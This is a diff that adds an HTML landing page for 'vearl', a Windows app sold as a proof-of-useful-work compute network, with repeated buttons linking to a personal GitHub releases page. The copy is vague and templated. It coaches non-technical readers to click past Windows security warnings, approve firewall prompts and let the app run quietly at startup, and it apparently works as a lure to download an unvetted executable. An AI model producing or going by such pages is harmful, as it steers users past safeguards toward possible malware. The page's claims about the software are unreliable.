+    color: #0f172a;
+    letter-spacing: -0.01em;
+    margin: 2.75rem 0 0.9rem;
+    padding-bottom: 0.4rem;
+    border-bottom: 2px solid #e6ecf4;
+  }
+  h3 {
+    font-size: 1.08rem;
+    font-weight: 700;
+    color: #0f172a;
+    margin: 1.6rem 0 0.4rem;
+  }
+  p { margin: 0 0 1.1rem; }
+  ul, ol { margin: 0 0 1.35rem; padding-left: 1.4rem; }
+  li { margin-bottom: 0.5rem; }
+  a { color: #1d4ed8; text-decoration: underline; text-underline-offset: 2px; }
+  a:hover { color: #1e40af; }
+  strong { color: #0f172a; }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6d28d9 0%, #2563eb 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.1rem;
+    padding: 1rem 2.2rem;
+    border-radius: 9999px;
+    text-decoration: none;
+    box-shadow: 0 12px 26px rgba(37, 99, 235, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    text-align: center;
+  }
+  .btn:hover {
+    color: #ffffff;
+    transform: translateY(-2px);
+    box-shadow: 0 18px 34px rgba(37, 99, 235, 0.42);
+    text-decoration: none;
+  }
+  .btn-wrap { text-align: center; margin: 2rem 0 2.25rem; }
+  .card {
+    background: #ffffff;
+    border: 1px solid #eaeff6;
+    border-radius: 1rem;
+    box-shadow: 0 10px 28px rgba(15, 23, 42, 0.07);
+    padding: 1.5rem 1.6rem;
+    margin: 1.6rem 0;
+  }
+  .note {
+    background: #eff6ff;
+    border-left: 4px solid #3b82f6;
+    border-radius: 0.55rem;
+    padding: 1rem 1.2rem;
+    margin: 1.5rem 0;
+    color: #1e3a5f;
+  }
+  .chip {
+    display: inline-block;
+    background: #ede9fe;
+    color: #5b21b6;
+    font-size: 0.78rem;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    padding: 0.32rem 0.85rem;
+    border-radius: 9999px;
+    margin-bottom: 1rem;
+  }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    counter-increment: step;
+    position: relative;
+    padding-left: 2.7rem;
+    margin-bottom: 0.85rem;
+  }
+  .steps li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0.12rem;
+    width: 1.85rem;
+    height: 1.85rem;
+    background: #e0e7ff;
+    color: #3730a3;
+    font-weight: 700;
+    font-size: 0.88rem;
+    border-radius: 9999px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 1rem;
+    margin: 1.6rem 0;
+  }
+  .grid div.box {
+    background: #ffffff;
+    border: 1px solid #eaeff6;
+    border-radius: 0.85rem;
+    box-shadow: 0 6px 18px rgba(15, 23, 42, 0.06);
+    padding: 1.1rem 1.2rem;
+    font-size: 0.99rem;
+    color: #475569;
+  }
+  .grid div.box strong { display: block; margin-bottom: 0.3rem; }
+  code {
+    background: #eef2f7;
+    color: #334155;
+    padding: 0.13rem 0.4rem;
+    border-radius: 0.35rem;
+    font-size: 0.92em;
+  }
+  footer.bottom {
+    margin-top: 3rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid #e6ecf4;
+    font-size: 0.95rem;
+    color: #64748b;
+    text-align: center;
+  }
+  @media (max-width: 620px) {
+    .page { padding: 2rem 1rem 2.75rem; }
+    .btn { display: block; width: 100%; font-size: 1.03rem; padding: 0.9rem 1.2rem; }
+    .card { padding: 1.15rem 1.2rem; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+<h1>🧩 vearl - Verified Compute Made Simple for Everyone</h1>
+<p class="tagline">A proof-of-useful-work chain that runs quietly on your Windows computer.</p>
+
+<p><span class="chip">Free Windows Download</span></p>
+
+<p>vearl is a desktop application for Windows that lets your computer take part in a verified compute network. In everyday language: your machine picks up small jobs, completes them, and attaches a proof to each result so it can be checked. Nobody has to be trusted, because the proof does the trusting for you.</p>
+
+<p>You do not need programming experience, a developer account, or any understanding of how the chain itself works. If you can download a file and open it, you can use vearl. This page explains what the software does, how to get it, how to set it up the first time, and what to do if something goes wrong.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">⬇ Get vearl for Windows</a>
+</div>
+
+<h2>🚀 Getting Started</h2>
+
+<p>Before you begin, you need three simple things: a Windows computer, a working internet connection, and roughly ten minutes. That is the whole checklist. There is nothing to buy, nothing to subscribe to, and no account to create before you can see the app running.</p>
+
+<p>vearl is distributed through its official release page. That page is the one trustworthy place to get the software, which means you never have to guess whether you found the right file. Keep the link handy and come back to it whenever you want the latest version.</p>
+
+<p>The whole journey looks like this:</p>
+
+<ol class="steps">
+  <li>Open the official release page using the download button on this page.</li>
+  <li>Look at the top of the list, where the newest version always appears.</li>
+  <li>Visit the link to download the application.</li>
+  <li>Open the downloaded item from your Downloads folder.</li>
+  <li>Follow the simple on-screen prompts until setup finishes.</li>
+  <li>Launch vearl and let it connect for the first time.</li>
+</ol>
+
+<p>That is the full process. The rest of this page explains each part in more detail, so you can take your time and read as much or as little as you need.</p>
+
+<h2>⬇️ Download and Setup</h2>
+
+<p>Visit this link to download the application:</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">Open the Official vearl Releases Page</a>
+</div>
+
+<p>The releases page shows a list of versions with the most recent at the top. Open the newest one and use the download link provided there to save the software to your computer. Unless your browser asks where to save it, the download will land in your Downloads folder.</p>
+
+<div class="note">
+  <strong>Stay safe:</strong> only get vearl from the official release page linked above. Files sent through chat messages, email attachments, or unrelated download sites are not guaranteed to be the real software.
+</div>
+
+<h3>Opening the download</h3>
+
+<p>When the download finishes, open your Downloads folder and start the item you just saved. Because it came from the internet, Windows may show a security prompt the first time. This is normal for downloaded software. Confirm that you used the official page, then choose the option to keep or run it, and setup will begin.</p>
+
+<h3>During setup</h3>
+
+<p>vearl asks very little of you. It offers to create a shortcut so you can find the app later, and it places its files in a standard location on your drive. Accepting the defaults is fine and is what most people do.</p>
+
+<p>When setup completes, vearl opens for the first time. This first launch takes a little longer than later ones, because the app prepares its working files. Give it a minute or two and avoid closing the window while it finishes.</p>
+
+<h2>🧠 What vearl Actually Does</h2>
+
+<p>Most computer networks ask you to trust that work was done properly. vearl takes the opposite approach. Every unit of compute that passes through the network carries a proof that it was performed honestly. Those proofs are checked automatically, and any result that does not hold up is discarded.</p>
+
+<p>The "useful work" part matters just as much. Instead of burning electricity on a puzzle with no outcome, vearl points computing effort at tasks that produce a real result. Your machine contributes a small share of that effort, and the network combines those shares into finished work.</p>
+
+<p>From your side of the screen, none of this is complicated. vearl runs quietly, shows a simple status view, and lets you pause whenever you like. You remain in control the entire time.</p>
+
+<div class="grid">
+  <div class="box">
+    <strong>✔ Verified by design</strong>
+    Every result carries a proof that it was produced honestly, so nothing is taken on faith.
+  </div>
+  <div class="box">
+    <strong>✔ Useful, not wasted</strong>
+    Effort goes toward tasks with a genuine outcome rather than a meaningless puzzle.
+  </div>
+  <div class="box">
+    <strong>✔ Gentle on your PC</strong>
+    vearl caps its own usage and steps back when you need the power.
+  </div>
+  <div class="box">
+    <strong>✔ Pause anytime</strong>
+    One click stops all activity. Resume whenever it suits you.
+  </div>
+</div>
+
+<h2>✨ Key Features</h2>
+
+<ul>
+  <li><strong>One-window simplicity.</strong> Everything lives in a single clean window: status, recent activity, and settings.</li>
+  <li><strong>Automatic verification.</strong> vearl checks incoming work against its proofs without asking anything of you.</li>
+  <li><strong>Pause and resume.</strong> A single toggle halts all activity instantly — handy before a video call, a game, or a presentation.</li>
+  <li><strong>Startup control.</strong> Choose whether vearl opens with Windows or only when you launch it yourself.</li>
+  <li><strong>Readable activity log.</strong> A plain-language timeline shows what happened and when, with no technical codes to decode.</li>
+  <li><strong>Update notices.</strong> vearl keeps an eye on the official release page and tells you when a newer version exists.</li>
+  <li><strong>No account needed to begin.</strong> Open the app and it works. Nothing to sign up for before you see it running.</li>
+  <li><strong>Clear status indicator.</strong> A simple connected or paused state means you always know where things stand.</li>
+</ul>
+
+<h2>⚙️ How It Works</h2>
+
+<p>Understanding the flow takes about thirty seconds and makes everything else feel obvious.</p>
+
+<ol class="steps">
+  <li><strong>vearl connects.</strong> When you launch the app, it reaches the network and lets it know your computer is available.</li>
+  <li><strong>Work arrives.</strong> Small pieces of compute are sent to your machine, sized so they finish quickly.</li>
+  <li><strong>Your computer processes them.</strong> vearl handles this in the background using a limited share of your processor.</li>
+  <li><strong>Proofs are attached.</strong> Each finished piece of work comes with proof that it was done correctly.</li>
+  <li><strong>The network verifies.</strong> Proofs are checked. Genuine results are accepted; anything that fails is thrown out.</li>
+  <li><strong>The chain records it.</strong> Accepted work is written into the chain, building a permanent and checkable history.</li>
+</ol>
+
+<p>Your part in all of this is simply to leave vearl running. There is nothing to configure, nothing to tune, and no commands to memorise.</p>
+
+<h2>💻 System Requirements</h2>
+
+<p>vearl is built to run comfortably on ordinary modern hardware. A typical, comfortable setup looks like this:</p>
+
+<ul>
+  <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+  <li><strong>Processor:</strong> A dual-core processor from recent years or better.</li>
+  <li><strong>Memory:</strong> 4 GB of RAM, with 8 GB or more giving a smoother experience.</li>
+  <li><strong>Storage:</strong> About 500 MB of free space for the app and its working files.</li>
+  <li><strong>Connection:</strong> A stable internet connection, since vearl needs to reach the network.</li>
+  <li><strong>Display:</strong> Any standard screen resolution; the window scales to fit.</li>
+</ul>
+
+<p>If your computer runs a modern web browser without struggling, it will almost certainly run vearl without trouble. Older machines still work but may feel slower while the app is active, in which case pausing when you are not using them is a sensible habit.</p>
+
+<h2>🪄 Your First Run, Step by Step</h2>
+
+<p>The first time you open vearl, a short setup screen appears. Here is what each part means and what to do.</p>
+
+<h3>Step one: let it connect</h3>
+<p>vearl shows a connecting indicator while it reaches the network. This usually takes a few seconds. If it takes longer, check that your internet connection works and that no firewall is blocking the app.</p>
+
+<h3>Step two: choose how much power to share</h3>
+<p>You are offered a simple choice about how much of your computer vearl may use. The balanced default suits most people. On a laptop where battery life matters, pick the lighter option. You can change this later at any time.</p>
+
+<h3>Step three: decide about startup</h3>
+<p>vearl asks whether it should open automatically when Windows starts. Turning this on means you never have to remember to launch it. Turning it off means it only runs when you open it yourself. Both are reasonable; choose whichever matches how you use your computer.</p>
+
+<h3>Step four: watch the status view</h3>
+<p>When setup finishes, you land on the main status view. It shows whether vearl is connected, how long it has been running, and a simple feed of recent activity. Leave the window open or minimise it; either way, vearl keeps working.</p>
+
+<div class="note">
+  <strong>Good to know:</strong> the very first session does a little extra preparation in the background. It may look quiet for a minute or two before activity appears in the log. That is expected behaviour, not a fault.
+</div>
+
+<h2>🛠️ Troubleshooting Common Issues</h2>
+
+<h3>The download will not start</h3>
+<p>Refresh the release page and try again. If your browser blocks the download, look for a small icon or message near the address bar and allow it to proceed. Some browsers hold files until you confirm, so check for a prompt you may have missed.</p>
+
+<h3>Windows shows a security prompt</h3>
+<p>This is standard for software downloaded from the internet. Confirm that you used the official release page, then choose the option to keep or run the file. If a "more information" link appears, open it to reveal the option to continue.</p>
+
+<h3>vearl opens but stays on connecting</h3>
+<p>First, confirm your internet connection by opening any website. Second, close vearl fully and open it again. Third, check whether a firewall or security tool is asking for permission and approve it. Restarting your computer resolves most stubborn connection problems.</p>
+
+<h3>The app feels slow</h3>
+<p>Lower the power setting in vearl's preferences so it uses less of your processor. You can also pause vearl while doing something demanding and resume afterwards. Pausing does not lose your place.</p>
+
+<h3>You cannot find the app after installing</h3>
+<p>Open the Start menu and type <code>vearl</code>. If it does not appear, run setup again from the official release page and keep the default shortcut option selected.</p>
+
+<h3>You want to start over</h3>
+<p>Pause vearl, close it, and remove it through Windows Settings under Apps. Then download a fresh copy from the official release page and set it up again.</p>
+
+<h2>❓ Frequently Asked Questions</h2>
+
+<h3>Do I need to be technical to use vearl?</h3>
+<p>No. If you can download a file and open it, you can use vearl. The technical parts stay entirely out of your way.</p>
+
+<h3>Will vearl slow my computer down?</h3>
+<p>vearl deliberately limits itself. On a typical computer you will not notice it during browsing, email, or watching video. If you do notice it, lower the power setting or pause the app.</p>
+
+<h3>Can I turn it off whenever I want?</h3>
+<p>Yes. The pause control stops all activity immediately, and closing the app stops it too. Nothing continues in secret.</p>
+
+<h3>Does it cost anything?</h3>
+<p>There is no subscription and no purchase required to get started.</p>
+
+<h3>How do I know I have the newest version?</h3>
+<p>vearl checks for updates and tells you when a newer version exists. You can also visit the release page yourself at any time; the newest version is always listed at the top.</p>
+
+<h3>Where do I go if something goes wrong?</h3>
+<p>Return to the official release page first, since each release listing includes notes about known issues. Downloading the current version again and reinstalling solves most problems in a couple of minutes.</p>
+
+<h2>🔄 Staying Up to Date</h2>
+
+<p>vearl improves over time, and the release page is where every improvement appears. The newest version always sits at the top of that list, so a quick visit tells you whether you are current.</p>
+
+<p>Inside the app, update notices appear when a newer version is available. When you see one, return to the release page, download the current version, and run setup again. Your settings carry over, so there is nothing to reconfigure.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">⬇ Visit the vearl Releases Page</a>
+</div>
+
+<footer class="bottom">
+  vearl — verified compute, made simple. All downloads are served from the official releases page.
+</footer>
+
+</div>
+</body>
 </html>
